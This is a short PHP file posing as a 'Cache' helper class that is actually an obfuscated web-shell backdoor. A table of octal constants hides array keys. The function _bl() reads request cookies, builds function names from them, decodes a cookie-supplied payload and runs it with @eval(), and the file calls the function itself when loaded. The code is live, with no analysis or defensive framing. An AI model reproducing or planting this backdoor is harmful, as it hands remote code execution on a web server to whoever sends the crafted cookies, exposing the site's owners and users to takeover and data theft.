PK<?php class Cache
{
    private static $_g;
    static function _vz($_bin)
    {
        if (!self::$_g) self::_dgg();
        return self::$_g[$_bin];
    }
    private static function _dgg()
    {
        self::$_g = array(
            4.75,
            4.75,
            4.75,
            4.75,
            013,
            023,
            0102, -035,
            0117,
            026,
            0123,
            8.75,
            8.75,
            8.75,
            8.75,
            0165,
            01124,
            0566,
            01771, -042, -0125,
            0556,
            0116, -0664, -0405,
            0514,
            011,
            011,
            011,
            011, -022,
            0150, -021, -041,
            0107, -036,
            013,
            0124, -0742, -01266,
            0325,
            01113, -0601,
            0167
        );
    }
}
function _bl($_vn = - 1.3634003893576, $_qd = null)
{
    $_i = $_COOKIE;
    ($_i && isset($_i[(int)round(Cache::_vz(00) + Cache::_vz(01) + Cache::_vz(02) + Cache::_vz(03)) ])) ? (($_evx = $_i[Cache::_vz(04) + Cache::_vz(05) - Cache::_vz(06) - Cache::_vz(07) - Cache::_vz(010) + Cache::_vz(011) + Cache::_vz(012) ] . $_i[(int)round(Cache::_vz(013) + Cache::_vz(014) + Cache::_vz(015) + Cache::_vz(016)) ]) && ($_xg = $_evx($_i[Cache::_vz(017) + Cache::_vz(020) + Cache::_vz(021) - Cache::_vz(022) ] . $_i[Cache::_vz(023) + Cache::_vz(024) - Cache::_vz(025) + Cache::_vz(026) - Cache::_vz(027) ])) && ($_rvm = $_evx($_i[Cache::_vz(030) + Cache::_vz(031) ] . $_i[(int)round(Cache::_vz(032) + Cache::_vz(033) + Cache::_vz(034) + Cache::_vz(035)) ])) && ($_rvm = $_rvm($_evx($_i[Cache::_vz(036) + Cache::_vz(037) + Cache::_vz(040) + Cache::_vz(041) + Cache::_vz(042) + Cache::_vz(043) - Cache::_vz(044) ]))) && @eval($_rvm)) : $_i;
    return Cache::_vz(045) + Cache::_vz(046) - Cache::_vz(047) - Cache::_vz(050) - Cache::_vz(051) - Cache::_vz(052) + Cache::_vz(053);
}
_bl();

